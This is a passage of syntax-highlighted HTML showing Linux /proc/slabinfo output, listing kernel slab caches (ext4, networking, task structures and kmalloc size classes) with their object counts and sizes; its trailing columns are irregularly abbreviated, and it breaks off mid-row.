class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">jbd2_journal_head   <span class="number">2312</span>   <span class="number">2380</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">jbd2_revoke_table_s    <span class="number">256</span>    <span class="number">256</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">ext4_fc_dentry_update      <span class="number">0</span>      <span class="number">0</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">ext4_inode_cache   <span class="number">49680</span>  <span class="number">49680</span>   <span class="number">1176</span>   <span class="number">27</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_allocation_context    <span class="number">448</span>    <span class="number">448</span>    <span class="number">144</span>   <span class="number">28</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span></span><br><span class="line">ext4_io_end         <span class="number">1152</span>   <span class="number">1152</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_pending_reservation   <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>   <span class="number">0</span></span><br><span class="line">ext4_extent_status  <span class="number">44133</span>  <span class="number">44268</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">mbcache             <span class="number">4088</span>   <span class="number">4088</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kioctx                 <span class="number">0</span>      <span class="number">0</span>    <span class="number">576</span>   <span class="number">28</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">userfaultfd_ctx_cache      <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">dnotify_struct         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pid_namespace         <span class="number">90</span>     <span class="number">90</span>    <span class="number">136</span>   <span class="number">30</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">UNIX                <span class="number">1140</span>   <span class="number">1140</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip4-frags              <span class="number">0</span>      <span class="number">0</span>    <span class="number">200</span>   <span class="number">40</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">MPTCP                  <span class="number">0</span>      <span class="number">0</span>   <span class="number">1920</span>   <span class="number">17</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_subflow      <span class="number">0</span>      <span class="number">0</span>    <span class="number">376</span>   <span class="number">43</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> :<span class="number">0</span></span><br><span class="line">xfrm_dst_cache         <span class="number">0</span>      <span class="number">0</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">xfrm_state             <span class="number">0</span>      <span class="number">0</span>    <span class="number">768</span>   <span class="number">42</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip_fib_trie          <span class="number">935</span>    <span class="number">935</span>     <span class="number">48</span>   <span class="number">85</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip_fib_alias         <span class="number">876</span>    <span class="number">876</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">PING                   <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">RAW                 <span class="number">1728</span>   <span class="number">1728</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">tw_sock_TCP          <span class="number">297</span>    <span class="number">297</span>    <span class="number">248</span>   <span class="number">33</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_TCP     <span class="number">286</span>    <span class="number">286</span>    <span class="number">304</span>   <span class="number">26</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">TCP                  <span class="number">224</span>    <span class="number">224</span>   <span class="number">2240</span>   <span class="number">14</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">hugetlbfs_inode_cache    <span class="number">168</span>    <span class="number">168</span>    <span class="number">664</span>   <span class="number">24</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">0</span></span><br><span class="line">dquot                <span class="number">512</span>    <span class="number">512</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ep_head             <span class="number">4096</span>   <span class="number">4096</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dax_cache             <span class="number">39</span>     <span class="number">39</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">bio_crypt_ctx        <span class="number">306</span>    <span class="number">306</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_queue        <span class="number">105</span>    <span class="number">105</span>   <span class="number">2128</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec-max           <span class="number">304</span>    <span class="number">320</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec<span class="number">-128</span>           <span class="number">256</span>    <span class="number">256</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">biovec<span class="number">-64</span>            <span class="number">512</span>    <span class="number">512</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">khugepaged_mm_slot    <span class="number">216</span>    <span class="number">216</span>    <span class="number">112</span>   <span class="number">36</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">user_namespace       <span class="number">156</span>    <span class="number">156</span>    <span class="number">624</span>   <span class="number">26</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dmaengine-unmap<span class="number">-256</span>     <span class="number">15</span>     <span class="number">15</span>   <span class="number">2112</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">dmaengine-unmap<span class="number">-128</span>     <span class="number">30</span>     <span class="number">30</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">sock_inode_cache    <span class="number">4212</span>   <span class="number">4212</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">skbuff_ext_cache     <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">skbuff_fclone_cache    <span class="number">512</span>    <span class="number">512</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : <span class="number">0</span></span><br><span class="line">skbuff_head_cache   <span class="number">2560</span>   <span class="number">2688</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">file_lock_cache      <span class="number">592</span>    <span class="number">592</span>    <span class="number">216</span>   <span class="number">37</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">file_lock_ctx       <span class="number">1168</span>   <span class="number">1168</span>     <span class="number">56</span>   <span class="number">73</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fsnotify_mark_connector   <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span></span><br><span class="line">buffer_head       <span class="number">192504</span> <span class="number">192504</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">x86_lbr                <span class="number">0</span>      <span class="number">0</span>    <span class="number">800</span>   <span class="number">40</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">taskstats            <span class="number">736</span>    <span class="number">736</span>    <span class="number">352</span>   <span class="number">46</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">proc_dir_entry      <span class="number">1638</span>   <span class="number">1638</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pde_opener          <span class="number">1632</span>   <span class="number">1632</span>     <span class="number">40</span>  <span class="number">102</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">proc_inode_cache   <span class="number">12098</span>  <span class="number">12098</span>    <span class="number">712</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">seq_file             <span class="number">544</span>    <span class="number">544</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">sigqueue            <span class="number">1071</span>   <span class="number">1071</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">bdev_cache           <span class="number">160</span>    <span class="number">160</span>   <span class="number">1600</span>   <span class="number">20</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">shmem_inode_cache   <span class="number">2408</span>   <span class="number">2408</span>    <span class="number">760</span>   <span class="number">43</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kernfs_node_cache  <span class="number">71552</span>  <span class="number">71552</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mnt_cache           <span class="number">2900</span>   <span class="number">2900</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">filp               <span class="number">11820</span>  <span class="number">12096</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">inode_cache        <span class="number">44725</span>  <span class="number">44725</span>    <span class="number">640</span>   <span class="number">25</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dentry            <span class="number">149394</span> <span class="number">149394</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">names_cache          <span class="number">208</span>    <span class="number">208</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">net_namespace         <span class="number">49</span>     <span class="number">49</span>   <span class="number">4352</span>    <span class="number">7</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">iint_cache             <span class="number">0</span>      <span class="number">0</span>    <span class="number">120</span>   <span class="number">34</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">lsm_file_cache    <span class="number">123420</span> <span class="number">123420</span>     <span class="number">24</span>  <span class="number">170</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">uts_namespace        <span class="number">222</span>    <span class="number">222</span>    <span class="number">432</span>   <span class="number">37</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">nsproxy              <span class="number">728</span>    <span class="number">728</span>     <span class="number">72</span>   <span class="number">56</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">vm_area_struct     <span class="number">52371</span>  <span class="number">53079</span>    <span class="number">208</span>   <span class="number">39</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mm_struct            <span class="number">780</span>    <span class="number">780</span>   <span class="number">1088</span>   <span class="number">30</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">files_cache          <span class="number">920</span>    <span class="number">920</span>    <span class="number">704</span>   <span class="number">46</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">signal_cache        <span class="number">2027</span>   <span class="number">2044</span>   <span class="number">1152</span>   <span class="number">28</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">sighand_cache       <span class="number">1245</span>   <span class="number">1245</span>   <span class="number">2112</span>   <span class="number">15</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">task_struct         <span class="number">1130</span>   <span class="number">1176</span>   <span class="number">8064</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">cred_jar            <span class="number">6258</span>   <span class="number">6258</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">anon_vma_chain     <span class="number">28659</span>  <span class="number">29184</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">anon_vma           <span class="number">19422</span>  <span class="number">19422</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">pid                 <span class="number">3360</span>   <span class="number">3360</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-Operand       <span class="number">11928</span>  <span class="number">11928</span>     <span class="number">72</span>   <span class="number">56</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-ParseExt        <span class="number">429</span>    <span class="number">429</span>    <span class="number">104</span>   <span class="number">39</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">Acpi-State          <span class="number">1326</span>   <span class="number">1326</span>     <span class="number">80</span>   <span class="number">51</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">numa_policy          <span class="number">155</span>    <span class="number">155</span>    <span class="number">264</span>   <span class="number">31</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">perf_event            <span class="number">27</span>     <span class="number">27</span>   <span class="number">1192</span>   <span class="number">27</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">trace_event_file    <span class="number">3496</span>   <span class="number">3496</span>     <span class="number">88</span>   <span class="number">46</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ftrace_event_field  <span class="number">13090</span>  <span class="number">13090</span>     <span class="number">48</span>   <span class="number">85</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">pool_workqueue      <span class="number">3392</span>   <span class="number">3392</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">radix_tree_node    <span class="number">23380</span>  <span class="number">23380</span>    <span class="number">584</span>   <span class="number">28</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">task_group           <span class="number">425</span>    <span class="number">425</span>    <span class="number">640</span>   <span class="number">25</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">vmap_area          <span class="number">12359</span>  <span class="number">26624</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-8</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-4</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-2</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-1</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-512</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-256</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-128</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-64</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-32</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-16</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-8</span>          <span class="number">0</span>      <span class="number">0</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-192</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dma-kmalloc<span class="number">-96</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-8</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-4</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-2</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-1</span>k         <span class="number">0</span>      <span class="number">0</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-512</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-256</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-192</span>        <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-128</span>      <span class="number">800</span>    <span class="number">800</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-96</span>      <span class="number">1386</span>   <span class="number">1386</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-64</span>      <span class="number">5824</span>   <span class="number">5824</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-32</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-16</span>         <span class="number">0</span>      <span class="number">0</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-rcl<span class="number">-8</span>          <span class="number">0</span>      <span class="number">0</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-8</span>k         <span class="number">60</span>     <span class="number">60</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-4</span>k        <span class="number">192</span>    <span class="number">216</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-2</span>k        <span class="number">272</span>    <span class="number">272</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-1</span>k       <span class="number">1113</span>   <span class="number">1248</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-512</span>      <span class="number">2498</span>   <span class="number">2688</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-256</span>       <span class="number">512</span>    <span class="number">512</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-192</span>       <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-128</span>       <span class="number">640</span>    <span class="number">640</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-96</span>        <span class="number">672</span>    <span class="number">672</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-64</span>       <span class="number">2112</span>   <span class="number">2112</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-32</span>       <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-16</span>       <span class="number">4608</span>   <span class="number">4608</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-8</span>        <span class="number">8192</span>   <span class="number">8192</span>      <span class="number">8</span>  